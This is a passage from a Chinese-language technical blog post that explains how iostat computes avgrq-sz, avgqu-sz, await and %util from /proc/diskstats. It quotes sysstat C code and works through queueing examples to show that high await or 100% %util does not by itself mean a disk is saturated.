class="line">   cprintf_f(4, 8, 2,</span><br><span class="line">             S_VALUE(ioj-&gt;rd_sectors, ioi-&gt;rd_sectors, itv) / fctr,</span><br><span class="line">             S_VALUE(ioj-&gt;wr_sectors, ioi-&gt;wr_sectors, itv) / fctr,</span><br><span class="line">             xds.arqsz,  //&#x6B64;&#x5904;&#x662F;avgrq-sz</span><br><span class="line">             S_VALUE(ioj-&gt;rq_ticks, ioi-&gt;rq_ticks, itv) / 1000.0);//&#x6B64;&#x5904;&#x662F;avgqu-sz</span><br></pre></td></tr></tbody></table></figure><h5 id="&#x6CE8;&#x610F;avgrq-sz&#x6765;&#x81EA;xds&#x7684;argsz&#x53D8;&#x91CF;&#xFF0C;&#x8BE5;&#x53D8;&#x91CF;&#x662F;&#x901A;&#x8FC7;&#x8BE5;&#x51FD;&#x6570;&#x8BA1;&#x7B97;&#x5F97;&#x5230;&#x7684;&#xFF1A;"><a href="#&#x6CE8;&#x610F;avgrq-sz&#x6765;&#x81EA;xds&#x7684;argsz&#x53D8;&#x91CF;&#xFF0C;&#x8BE5;&#x53D8;&#x91CF;&#x662F;&#x901A;&#x8FC7;&#x8BE5;&#x51FD;&#x6570;&#x8BA1;&#x7B97;&#x5F97;&#x5230;&#x7684;&#xFF1A;" class="headerlink" title="&#x6CE8;&#x610F;avgrq-sz&#x6765;&#x81EA;xds&#x7684;argsz&#x53D8;&#x91CF;&#xFF0C;&#x8BE5;&#x53D8;&#x91CF;&#x662F;&#x901A;&#x8FC7;&#x8BE5;&#x51FD;&#x6570;&#x8BA1;&#x7B97;&#x5F97;&#x5230;&#x7684;&#xFF1A;"></a>&#x6CE8;&#x610F;avgrq-sz&#x6765;&#x81EA;xds&#x7684;argsz&#x53D8;&#x91CF;&#xFF0C;&#x8BE5;&#x53D8;&#x91CF;&#x662F;&#x901A;&#x8FC7;&#x8BE5;&#x51FD;&#x6570;&#x8BA1;&#x7B97;&#x5F97;&#x5230;&#x7684;&#xFF1A;</h5><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/*&#x6CE8;&#x610F;sdc&#x4E2D;&#x7684;c&#x6307;&#x7684;&#x662F;current&#xFF0C;sdp&#x4E2D;&#x7684;p&#x6307;&#x7684;&#x662F;previous*/</span><br><span class="line">void compute_ext_disk_stats(struct stats_disk *sdc, struct stats_disk *sdp,</span><br><span class="line">                            unsigned long long itv, struct ext_disk_stats *xds)</span><br><span class="line">{</span><br><span class="line">        double tput</span><br><span class="line">                = ((double) (sdc-&gt;nr_ios - sdp-&gt;nr_ios)) * HZ / itv;</span><br><span class="line"></span><br><span class="line">        xds-&gt;util  = S_VALUE(sdp-&gt;tot_ticks, sdc-&gt;tot_ticks, itv);</span><br><span class="line">        xds-&gt;svctm = tput ? xds-&gt;util / tput : 0.0;</span><br><span class="line">        xds-&gt;await = (sdc-&gt;nr_ios - sdp-&gt;nr_ios) ?</span><br><span class="line">                ((sdc-&gt;rd_ticks - sdp-&gt;rd_ticks) + (sdc-&gt;wr_ticks - sdp-&gt;wr_ticks)) /</span><br><span class="line">                ((double) (sdc-&gt;nr_ios - sdp-&gt;nr_ios)) : 0.0;</span><br><span class="line">        </span><br><span class="line">        xds-&gt;arqsz = (sdc-&gt;nr_ios - sdp-&gt;nr_ios) ?</span><br><span class="line">                ((sdc-&gt;rd_sect - sdp-&gt;rd_sect) + (sdc-&gt;wr_sect - sdp-&gt;wr_sect)) /</span><br><span class="line">                ((double) (sdc-&gt;nr_ios - sdp-&gt;nr_ios)) : 0.0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><blockquote><p>&#x6CE8;&#x610F;nr_ios&#x6765;&#x81EA;&#x5982;&#x4E0B;&#x8FD0;&#x7B97;&#xFF0C;&#x5373;&#x8BFB;IO&#x548C;&#x5199;IO&#x7684;&#x548C;</p></blockquote><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sdc.nr_ios    = ioi-&gt;rd_ios + ioi-&gt;wr_ios;</span><br><span class="line">sdp.nr_ios    = ioj-&gt;rd_ios + ioj-&gt;wr_ios;</span><br></pre></td></tr></tbody></table></figure><h5 id="&#x90A3;&#x4E48;xds-gt-arqsz-&#x7684;&#x8BA1;&#x7B97;&#x5C31;&#x662F;&#x5982;&#x4E0B;&#x542B;&#x4E49;&#xFF1A;"><a href="#&#x90A3;&#x4E48;xds-gt-arqsz-&#x7684;&#x8BA1;&#x7B97;&#x5C31;&#x662F;&#x5982;&#x4E0B;&#x542B;&#x4E49;&#xFF1A;" class="headerlink" title="&#x90A3;&#x4E48;xds-&gt;arqsz &#x7684;&#x8BA1;&#x7B97;&#x5C31;&#x662F;&#x5982;&#x4E0B;&#x542B;&#x4E49;&#xFF1A;"></a>&#x90A3;&#x4E48;xds-&gt;arqsz &#x7684;&#x8BA1;&#x7B97;&#x5C31;&#x662F;&#x5982;&#x4E0B;&#x542B;&#x4E49;&#xFF1A;</h5><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xds-&gt;arqsz = (&#x8BFB;&#x6247;&#x533A;&#x603B;&#x6570; + &#x5199;&#x6247;&#x533A;&#x603B;&#x6570;)/(&#x8BFB;IO&#x6B21;&#x6570;+&#x5199;IO&#x6B21;&#x6570;)</span><br><span class="line">xds-&gt;arqsz = (sdc-&gt;nr_ios - sdp-&gt;nr_ios) ?</span><br><span class="line">          ((sdc-&gt;rd_sect - sdp-&gt;rd_sect) + (sdc-&gt;wr_sect - sdp-&gt;wr_sect)) /</span><br><span class="line">          ((double) (sdc-&gt;nr_ios - sdp-&gt;nr_ios)) : 0.0;</span><br></pre></td></tr></tbody></table></figure><h5 id="&#x597D;&#x5427;&#x3002;&#x53CD;&#x6B63;&#x6211;&#x662F;&#x975E;&#x5E38;&#x4E0D;&#x7406;&#x89E3;&#x8FD9;&#x4ED6;&#x5988;&#x7684;&#x548B;&#x56DE;&#x4E8B;&#x1F602;&#x3002;"><a href="#&#x597D;&#x5427;&#x3002;&#x53CD;&#x6B63;&#x6211;&#x662F;&#x975E;&#x5E38;&#x4E0D;&#x7406;&#x89E3;&#x8FD9;&#x4ED6;&#x5988;&#x7684;&#x548B;&#x56DE;&#x4E8B;&#x1F602;&#x3002;" class="headerlink" title="&#x597D;&#x5427;&#x3002;&#x53CD;&#x6B63;&#x6211;&#x662F;&#x975E;&#x5E38;&#x4E0D;&#x7406;&#x89E3;&#x8FD9;&#x4ED6;&#x5988;&#x7684;&#x548B;&#x56DE;&#x4E8B;&#x1F602;&#x3002;"></a>&#x597D;&#x5427;&#x3002;&#x53CD;&#x6B63;&#x6211;&#x662F;&#x975E;&#x5E38;&#x4E0D;&#x7406;&#x89E3;&#x8FD9;&#x4ED6;&#x5988;&#x7684;&#x548B;&#x56DE;&#x4E8B;&#x1F602;&#x3002;</h5><h2 id="avgqu-sz&#x7684;&#x8BA1;&#x7B97;"><a href="#avgqu-sz&#x7684;&#x8BA1;&#x7B97;" class="headerlink" title="avgqu-sz&#x7684;&#x8BA1;&#x7B97;"></a>avgqu-sz&#x7684;&#x8BA1;&#x7B97;</h2><h4 id="&#x5E73;&#x5747;&#x961F;&#x5217;&#x957F;&#x5EA6;&#x7684;&#x8BA1;&#x7B97;&#xFF0C;&#x8FD9;&#x4E2A;&#x8BA1;&#x7B97;&#x5C31;&#x7528;&#x5230;&#x4E86;diskstats&#x4E2D;time-in-queue&#x8FD9;&#x4E2A;&#x503C;&#x3002;"><a href="#&#x5E73;&#x5747;&#x961F;&#x5217;&#x957F;&#x5EA6;&#x7684;&#x8BA1;&#x7B97;&#xFF0C;&#x8FD9;&#x4E2A;&#x8BA1;&#x7B97;&#x5C31;&#x7528;&#x5230;&#x4E86;diskstats&#x4E2D;time-in-queue&#x8FD9;&#x4E2A;&#x503C;&#x3002;" class="headerlink" title="&#x5E73;&#x5747;&#x961F;&#x5217;&#x957F;&#x5EA6;&#x7684;&#x8BA1;&#x7B97;&#xFF0C;&#x8FD9;&#x4E2A;&#x8BA1;&#x7B97;&#x5C31;&#x7528;&#x5230;&#x4E86;diskstats&#x4E2D;time_in_queue&#x8FD9;&#x4E2A;&#x503C;&#x3002;"></a>&#x5E73;&#x5747;&#x961F;&#x5217;&#x957F;&#x5EA6;&#x7684;&#x8BA1;&#x7B97;&#xFF0C;&#x8FD9;&#x4E2A;&#x8BA1;&#x7B97;&#x5C31;&#x7528;&#x5230;&#x4E86;diskstats&#x4E2D;time_in_queue&#x8FD9;&#x4E2A;&#x503C;&#x3002;</h4><h4 id="&#x8FD9;&#x4E2A;&#x503C;&#x7684;&#x8BA1;&#x7B97;&#x6765;&#x81EA;&#x8FD9;&#x53E5;&#x8BDD;&#xFF1A;"><a href="#&#x8FD9;&#x4E2A;&#x503C;&#x7684;&#x8BA1;&#x7B97;&#x6765;&#x81EA;&#x8FD9;&#x53E5;&#x8BDD;&#xFF1A;" class="headerlink" title="&#x8FD9;&#x4E2A;&#x503C;&#x7684;&#x8BA1;&#x7B97;&#x6765;&#x81EA;&#x8FD9;&#x53E5;&#x8BDD;&#xFF1A;"></a>&#x8FD9;&#x4E2A;&#x503C;&#x7684;&#x8BA1;&#x7B97;&#x6765;&#x81EA;&#x8FD9;&#x53E5;&#x8BDD;&#xFF1A;</h4><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S_VALUE(ioj-&gt;rq_ticks, ioi-&gt;rq_ticks, itv) / 1000.0)</span><br></pre></td></tr></tbody></table></figure><p>&#x5176;&#x4E2D;rq_ticks&#x5373;diskstats&#x4E2D;&#x7684;time_in_queue&#x3002;</p><p>&#x6211;&#x4EEC;&#x8003;&#x8651;&#x5982;&#x4E0B;&#x7684;&#x573A;&#x666F;&#xFF0C;&#x5982;&#x679C;IO&#x8BF7;&#x6C42;&#x6709;&#x4E00;&#x4E2A;burst&#xFF0C;&#x540C;&#x4E00;&#x65F6;&#x95F4;&#x6765;&#x4E86;250&#x4E2A;IO&#x8BF7;&#x6C42;&#xFF0C;&#x540E;&#x7EED;&#x518D;&#x4E5F;&#x6CA1;&#x6709;&#x65B0;&#x7684;&#x8BF7;&#x6C42;&#x5230;&#x6765;&#x3002;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6BCF;&#x4E2A;&#x8BF7;&#x6C42;&#x5904;&#x7406;&#x65F6;&#x95F4;&#x90FD;&#x662F;4ms&#xFF0C;&#x90A3;&#x4E48;&#x6240;&#x6709;IO&#x7684;&#x5E73;&#x5747;&#x7B49;&#x5F85;&#x65F6;&#x95F4;&#x4E3A;&#xFF1A;<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x5E73;&#x5747;&#x7B49;&#x5F85;&#x65F6;&#x95F4; = &#x5355;&#x4E2A;&#x8BF7;&#x6C42;&#x5904;&#x7406;&#x65F6;&#x95F4;*(1+2+3+4...+(&#x8BF7;&#x6C42;&#x603B;&#x6570;-1))/&#x8BF7;&#x6C42;&#x603B;&#x6570;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5BF9;&#x4E8E;&#x6211;&#x4EEC;&#x8FD9;&#x4E2A;&#x4F8B;&#x5B50;&#x800C;&#x8A00;&#xFF0C;&#x5E73;&#x5747;&#x7B49;&#x5F85;&#x65F6;&#x95F4;&#x662F;4*125 = 500 ms</p><p>&#x90A3;&#x4E48;&#x6240;&#x6709;IO&#x82B1;&#x8D39;&#x7684;&#x603B;&#x65F6;&#x95F4;&#x4E3A;250*500=125000&#x6BEB;&#x79D2;&#xFF0C;&#x8FD9;&#x4E2A;&#x65F6;&#x95F4;&#x9664;&#x4EE5;1000&#x6BEB;&#x79D2;&#xFF1A;<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">125000/1000 = 125</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5373;&#x5E73;&#x5747;&#x4E0B;&#x6765;&#xFF0C;&#x961F;&#x5217;&#x7684;&#x957F;&#x5EA6;&#x662F;125 &#xFF0C;&#x8FD9;&#x4E2A;&#x503C;&#x5F88;&#x660E;&#x663E;&#x662F;&#x7B26;&#x5408;&#x76F4;&#x89C2;&#x7684;&#x3002;&#x6392;&#x5728;&#x961F;&#x5217;&#x6700;&#x524D;&#x7AEF;&#x7684;IO&#x8BA4;&#x4E3A;&#xFF0C;&#x961F;&#x5217;&#x7684;&#x957F;&#x5EA6;&#x662F;0&#xFF0C;&#x7B2C;2&#x4E2A;IO&#x8BA4;&#x4E3A;&#x961F;&#x5217;&#x7684;&#x957F;&#x5EA6;&#x662F;1&#xFF0C;&#x7B2C;3&#x4E2A;IO&#x8BA4;&#x4E3A;&#x961F;&#x5217;&#x7684;&#x957F;&#x5EA6;&#x662F;2&#xFF0C;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x8BA4;&#x4E3A;&#x961F;&#x5217;&#x7684;&#x957F;&#x5EA6;&#x662F;249&#x3002;</p><p>&#x6211;&#x4EEC;&#x6362;&#x4E00;&#x79CD;&#x601D;&#x8DEF;&#x6765;&#x8003;&#x8651;&#xFF0C;&#x5373;diskstats&#x4E2D;time_in_queue&#x7684;&#x601D;&#x8DEF;&#x3002;</p><p>&#x5F53;&#x7B2C;&#x4E00;&#x4E2A;IO&#x5B8C;&#x6210;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x961F;&#x5217;&#x4E2D;250&#x4E2A;IO&#xFF0C;250&#x4E2A;IO&#x90FD;&#x7B49;&#x4E86;4ms&#xFF0C;&#x5373;time_in_queue + = (250<em>4) &#xFF0C;&#x5F53;&#x7B2C;&#x4E8C;&#x4E2A;IO&#x5B8C;&#x6210;&#x7684;&#x65F6;&#x5019;&#xFF0C;time_in_queue += (249</em>4)&#xFF0C;&#x5F53;&#x6240;&#x6709;IO&#x90FD;&#x5B8C;&#x6210;&#x7684;&#x65F6;&#x5019;&#xFF0C;time_in_queue = 4*(250+249+248&#x2026;.+1)&#xFF0C; &#x2026;</p><p>&#x6839;&#x636E;time_in_queue/1000,&#x6B8A;&#x9014;&#x540C;&#x5F52;&#x5730;&#x83B7;&#x5F97;&#x4E86;&#x5E73;&#x5747;&#x961F;&#x5217;&#x957F;&#x5EA6;&#x3002;</p><h2 id="await&#x3001;r-wait&#x53CA;w-wait&#x7684;&#x8BA1;&#x7B97;"><a href="#await&#x3001;r-wait&#x53CA;w-wait&#x7684;&#x8BA1;&#x7B97;" class="headerlink" title="await&#x3001;r_wait&#x53CA;w_wait&#x7684;&#x8BA1;&#x7B97;"></a>await&#x3001;r_wait&#x53CA;w_wait&#x7684;&#x8BA1;&#x7B97;</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">void compute_ext_disk_stats(struct stats_disk *sdc, struct stats_disk *sdp,</span><br><span class="line">                            unsigned long long itv, struct ext_disk_stats *xds)</span><br><span class="line">{</span><br><span class="line">        ...</span><br><span class="line">        xds-&gt;await = (sdc-&gt;nr_ios - sdp-&gt;nr_ios) ?</span><br><span class="line">                ((sdc-&gt;rd_ticks - sdp-&gt;rd_ticks) + (sdc-&gt;wr_ticks - sdp-&gt;wr_ticks)) /</span><br><span class="line">                ((double) (sdc-&gt;nr_ios - sdp-&gt;nr_ios)) : 0.0; </span><br><span class="line">        ...</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>&#x8FD9;&#x4E2A;&#x6CA1;&#x5565;&#x597D;&#x8BF4;&#x7684;&#x4E86;&#xFF1A;<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">await = ((&#x6240;&#x6709;&#x8BFB;IO&#x7684;&#x65F6;&#x95F4;)+(&#x6240;&#x6709;&#x5199;IO&#x7684;&#x65F6;&#x95F4;))/((&#x8BFB;&#x8BF7;&#x6C42;&#x7684;&#x4E2A;&#x6570;) + (&#x5199;&#x8BF7;&#x6C42;&#x7684;&#x4E2A;&#x6570;))</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6CE8;&#x610F;&#x4E00;&#x70B9;&#x5C31;&#x884C;&#x4E86;&#xFF0C;&#x8FD9;&#x4E2A;&#x6240;&#x6709;&#x8BFB;IO&#x7684;&#x65F6;&#x95F4;&#x548C;&#x6240;&#x6709;&#x5199;IO&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x90FD;&#x662F;&#x5305;&#x62EC;IO&#x5728;&#x961F;&#x5217;&#x7684;&#x65F6;&#x95F4;&#x5728;&#x5185;&#x7684;&#x3002;&#x4E0D;&#x80FD;&#x4E00;&#x53A2;&#x60C5;&#x613F;&#x5730;&#x8BA4;&#x4E3A;&#xFF0C;&#x662F;&#x78C1;&#x76D8;&#x63A7;&#x5236;&#x5668;&#x5904;&#x7406;&#x8BE5;IO&#x7684;&#x65F6;&#x95F4;&#x3002;</p><p>&#x6CE8;&#x610F;&#xFF0C;&#x80FD;&#x4E0D;&#x80FD;&#x8BF4;&#xFF0C;await&#x6BD4;&#x8F83;&#x9AD8;&#xFF0C;&#x6240;&#x4EE5;&#x6B66;&#x65AD;&#x5730;&#x5224;&#x5B9A;&#x8FD9;&#x5757;&#x76D8;&#x7684;&#x80FD;&#x529B;&#x5F88;&#x83DC;&#xFF1F;&#x7B54;&#x6848;&#x662F;&#x4E0D;&#x80FD;&#x3002;await&#x8FD9;&#x4E2A;&#x503C;&#x4E0D;&#x80FD;&#x53CD;&#x6620;&#x786C;&#x76D8;&#x8BBE;&#x5907;&#x7684;&#x6027;&#x80FD;&#x3002;await&#x7684;&#x8FD9;&#x4E2A;&#x503C;&#x4E0D;&#x80FD;&#x53CD;&#x6620;&#x786C;&#x76D8;&#x8BBE;&#x5907;&#x7684;&#x6027;&#x80FD;&#xFF0C;await&#x8FD9;&#x4E2A;&#x503C;&#x4E0D;&#x80FD;&#x53CD;&#x6620;&#x786C;&#x76D8;&#x8BBE;&#x5907;&#x7684;&#x6027;&#x80FD;&#xFF0C;&#x91CD;&#x8981;&#x7684;&#x8BDD;&#x8BB2;&#x4E09;&#x904D;&#x3002;</p><p>&#x6211;&#x4EEC;&#x8003;&#x8651;&#x4E24;&#x79CD;IO&#x7684;&#x6A21;&#x578B;</p><ul><li>250&#x4E2A;IO&#x8BF7;&#x6C42;&#x540C;&#x65F6;&#x8FDB;&#x5165;&#x7B49;&#x5F85;&#x961F;&#x5217;</li><li>250&#x4E2A;IO&#x8BF7;&#x6C42;&#x540C;&#x65F6;&#x8FDB;&#x5165;&#x7B49;&#x5F85;&#x961F;&#x5217;</li></ul><p>&#x7B2C;&#x4E00;&#x79CD;&#x60C5;&#x51B5;await&#x9AD8;&#x8FBE;500ms&#xFF0C;&#x7B2C;&#x4E8C;&#x4E2A;&#x60C5;&#x51B5;await&#x53EA;&#x6709;4ms&#xFF0C;&#x4F46;&#x662F;&#x90FD;&#x662F;&#x540C;&#x4E00;&#x5757;&#x76D8;&#x3002;</p><p>&#x4F46;&#x662F;&#x6CE8;&#x610F;await&#x662F;&#x76F8;&#x5F53;&#x91CD;&#x8981;&#x7684;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x5B83;&#x8868;&#x660E;&#x4E86;&#x7528;&#x6237;&#x53D1;&#x8D77;&#x7684;IO&#x8BF7;&#x6C42;&#x7684;&#x5E73;&#x5747;&#x5EF6;&#x8FDF;&#xFF1A;<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wait  = IO &#x5E73;&#x5747;&#x5904;&#x7406;&#x65F6;&#x95F4; + IO&#x5728;&#x961F;&#x5217;&#x7684;&#x5E73;&#x5747;&#x7B49;&#x5F85;&#x65F6;&#x95F4;</span><br></pre></td></tr></tbody></table></figure><p></p><blockquote><blockquote><p>&#x56E0;&#x6B64;&#xFF0C;&#x8FD9;&#x4E2A;&#x6307;&#x6807;&#x662F;&#x6BD4;&#x8F83;&#x91CD;&#x8981;&#x7684;&#x4E00;&#x4E2A;&#x6307;&#x6807;&#x1F633;&#x3002;</p></blockquote></blockquote><h2 id="util-&#x548C;&#x78C1;&#x76D8;&#x8BBE;&#x5907;&#x9971;&#x548C;&#x5EA6;"><a href="#util-&#x548C;&#x78C1;&#x76D8;&#x8BBE;&#x5907;&#x9971;&#x548C;&#x5EA6;" class="headerlink" title="%util &#x548C;&#x78C1;&#x76D8;&#x8BBE;&#x5907;&#x9971;&#x548C;&#x5EA6;"></a>%util &#x548C;&#x78C1;&#x76D8;&#x8BBE;&#x5907;&#x9971;&#x548C;&#x5EA6;</h2><h6 id="&#x6CE8;&#x610F;&#xFF0C;-util&#x662F;&#x6700;&#x5BB9;&#x6613;&#x8BA9;&#x4EBA;&#x4EA7;&#x751F;&#x8BEF;&#x89E3;&#x7684;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x3002;&#x5F88;&#x591A;&#x521D;&#x5B66;&#x8005;&#x770B;&#x5230;-util-&#x7B49;&#x4E8E;100-&#x5C31;&#x8BF4;&#x786C;&#x76D8;&#x80FD;&#x529B;&#x5230;&#x9876;&#x4E86;&#xFF0C;&#x8FD9;&#x79CD;&#x8BF4;&#x6CD5;&#x662F;&#x9519;&#x8BEF;&#x7684;&#x1F628;&#x3002;"><a href="#&#x6CE8;&#x610F;&#xFF0C;-util&#x662F;&#x6700;&#x5BB9;&#x6613;&#x8BA9;&#x4EBA;&#x4EA7;&#x751F;&#x8BEF;&#x89E3;&#x7684;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x3002;&#x5F88;&#x591A;&#x521D;&#x5B66;&#x8005;&#x770B;&#x5230;-util-&#x7B49;&#x4E8E;100-&#x5C31;&#x8BF4;&#x786C;&#x76D8;&#x80FD;&#x529B;&#x5230;&#x9876;&#x4E86;&#xFF0C;&#x8FD9;&#x79CD;&#x8BF4;&#x6CD5;&#x662F;&#x9519;&#x8BEF;&#x7684;&#x1F628;&#x3002;" class="headerlink" title="&#x6CE8;&#x610F;&#xFF0C;%util&#x662F;&#x6700;&#x5BB9;&#x6613;&#x8BA9;&#x4EBA;&#x4EA7;&#x751F;&#x8BEF;&#x89E3;&#x7684;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x3002;&#x5F88;&#x591A;&#x521D;&#x5B66;&#x8005;&#x770B;&#x5230;%util &#x7B49;&#x4E8E;100%&#x5C31;&#x8BF4;&#x786C;&#x76D8;&#x80FD;&#x529B;&#x5230;&#x9876;&#x4E86;&#xFF0C;&#x8FD9;&#x79CD;&#x8BF4;&#x6CD5;&#x662F;&#x9519;&#x8BEF;&#x7684;&#x1F628;&#x3002;"></a>&#x6CE8;&#x610F;&#xFF0C;%util&#x662F;&#x6700;&#x5BB9;&#x6613;&#x8BA9;&#x4EBA;&#x4EA7;&#x751F;&#x8BEF;&#x89E3;&#x7684;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x3002;&#x5F88;&#x591A;&#x521D;&#x5B66;&#x8005;&#x770B;&#x5230;%util &#x7B49;&#x4E8E;100%&#x5C31;&#x8BF4;&#x786C;&#x76D8;&#x80FD;&#x529B;&#x5230;&#x9876;&#x4E86;&#xFF0C;&#x8FD9;&#x79CD;&#x8BF4;&#x6CD5;&#x662F;<strong>&#x9519;&#x8BEF;</strong>&#x7684;&#x1F628;&#x3002;</h6><p>%util&#x6570;&#x636E;&#x6E90;&#x81EA;diskstats&#x4E2D;&#x7684;io_ticks&#xFF0C;&#x8FD9;&#x4E2A;&#x503C;&#x5E76;&#x4E0D;&#x5173;&#x5FC3;&#x7B49;&#x5F85;&#x5728;&#x961F;&#x91CC;&#x91CC;&#x9762;IO&#x7684;&#x4E2A;&#x6570;&#xFF0C;&#x5B83;&#x53EA;&#x5173;&#x5FC3;&#x961F;&#x5217;&#x4E2D;&#x6709;&#x6CA1;&#x6709;IO&#x3002;</p><p>&#x548C;&#x8D85;&#x65F6;&#x6392;&#x961F;&#x7ED3;&#x8D26;&#x8FD9;&#x4E2A;&#x7C7B;&#x6BD4;&#x6700;&#x672C;&#x8D28;&#x7684;&#x533A;&#x522B;&#x5728;&#x4E8E;&#xFF0C;&#x73B0;&#x4EE3;&#x786C;&#x76D8;&#x90FD;&#x6709;&#x5E76;&#x884C;&#x5904;&#x7406;&#x591A;&#x4E2A;IO&#x7684;&#x80FD;&#x529B;&#xFF0C;&#x4F46;&#x662F;&#x6536;&#x94F6;&#x5458;&#x6CA1;&#x6709;&#x3002;&#x6536;&#x94F6;&#x5458;&#x65E0;&#x6CD5;&#x505A;&#x5230;&#x540C;&#x65F6;&#x5904;&#x7406;10&#x4E2A;&#x987E;&#x5BA2;&#x7684;&#x7ED3;&#x8D26;&#x4EFB;&#x52A1;&#x800C;&#x6D88;&#x8017;&#x7684;&#x603B;&#x65F6;&#x95F4;&#x4E0E;&#x5904;&#x7406;&#x4E00;&#x4E2A;&#x987E;&#x5BA2;&#x7ED3;&#x8D26;&#x4EFB;&#x52A1;&#x76F8;&#x5DEE;&#x65E0;&#x51E0;&#x3002;&#x4F46;&#x662F;&#x78C1;&#x76D8;&#x53EF;&#x4EE5;&#x3002;&#x6240;&#x4EE5;&#xFF0C;&#x5373;&#x4F7F;%util&#x5230;&#x4E86;100%&#xFF0C;&#x4E5F;&#x5E76;&#x4E0D;&#x610F;&#x5473;&#x7740;&#x8BBE;&#x5907;&#x9971;&#x548C;&#x4E86;&#x3002;</p><p>&#x6700;&#x7B80;&#x5355;&#x7684;&#x4F8B;&#x5B50;&#x662F;&#xFF0C;&#x67D0;&#x786C;&#x76D8;&#x5904;&#x7406;&#x5355;&#x4E2A;IO&#x8BF7;&#x6C42;&#x9700;&#x8981;0.1&#x79D2;&#xFF0C;&#x6709;&#x80FD;&#x529B;&#x540C;&#x65F6;&#x5904;&#x7406;10&#x4E2A;&#x3002;&#x4F46;&#x662F;&#x5F53;10&#x4E2A;&#x8BF7;&#x6C42;&#x4F9D;&#x6B21;&#x63D0;&#x4EA4;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x9700;&#x8981;1&#x79D2;&#x949F;&#x624D;&#x80FD;&#x5B8C;&#x6210;&#x8FD9;10%&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#xFF0C;&#x5728;1&#x79D2;&#x7684;&#x91C7;&#x6837;&#x5468;&#x671F;&#x91CC;&#xFF0C;%util&#x8FBE;&#x5230;&#x4E86;100%&#x3002;&#x4F46;&#x662F;&#x5982;&#x679C;10&#x4E2A;&#x8BF7;&#x4E00;&#x6B21;&#x6027;&#x63D0;&#x4EA4;&#x7684;&#x8BDD;&#xFF0C; &#x786C;&#x76D8;&#x53EF;&#x4EE5;&#x5728;0.1&#x79D2;&#x5185;&#x5168;&#x90E8;&#x5B8C;&#x6210;&#xFF0C;&#x8FD9;&#x65F6;&#x5019;&#xFF0C;%util&#x53EA;&#x6709;10%&#x3002;</p><p>&#x56E0;&#x6B64;&#xFF0C;&#x5728;&#x4E0A;&#x9762;&#x7684;&#x4F8B;&#x5B50;&#x4E2D;&#xFF0C;&#x4E00;&#x79D2;&#x4E2D;10&#x4E2A;IO&#xFF0C;&#x5373;IOPS=10&#x7684;&#x65F6;&#x5019;&#xFF0C;%util&#x5C31;&#x8FBE;&#x5230;&#x4E86;100%&#xFF0C;&#x8FD9;&#x5E76;&#x4E0D;&#x80FD;&#x8868;&#x660E;&#xFF0C;&#x8BE5;&#x76D8;&#x7684;IOPS&#x5C31;&#x53EA;&#x80FD;&#x5230;10&#xFF0C;&#x4E8B;&#x5B9E;&#x4E0A;&#xFF0C;&#x7EB5;&#x4F7F;%util&#x5230;&#x4E86;100%&#xFF0C;&#x786C;&#x76D8;&#x53EF;&#x80FD;&#x4ECD;&#x7136;&#x6709;&#x5F88;&#x5927;&#x7684;&#x4F59;&#x529B;&#x5904;&#x7406;&#x66F4;&#x591A;&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x5373;&#x5E76;&#x672A;&#x8FBE;&#x5230;&#x9971;&#x548C;&#x7684;&#x72B6;&#x6001;&#x3002;</p><p>&#x4E0B;&#x4E00;&#x5C0F;&#x8282;&#x6709;4&#x5F20;&#x56FE;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5F53;IOPS&#x4E3A;1000&#x7684;&#x65F6;&#x5019;%util&#x4E3A;100%&#xFF0C;&#x4F46;&#x662F;&#x5E76;&#x4E0D;&#x610F;&#x5473;&#x7740;&#x8BE5;&#x76D8;&#x7684;IOPS&#x5C31;&#x5728;1000&#xFF0C;&#x5B9E;&#x9645;&#x4E0A;2000&#xFF0C;3000,5000&#x7684;IOPS&#x90FD;&#x53EF;&#x4EE5;&#x8FBE;&#x5230;&#x3002;&#x6839;&#x636E;%util 100%&#x65F6;&#x7684; r/s 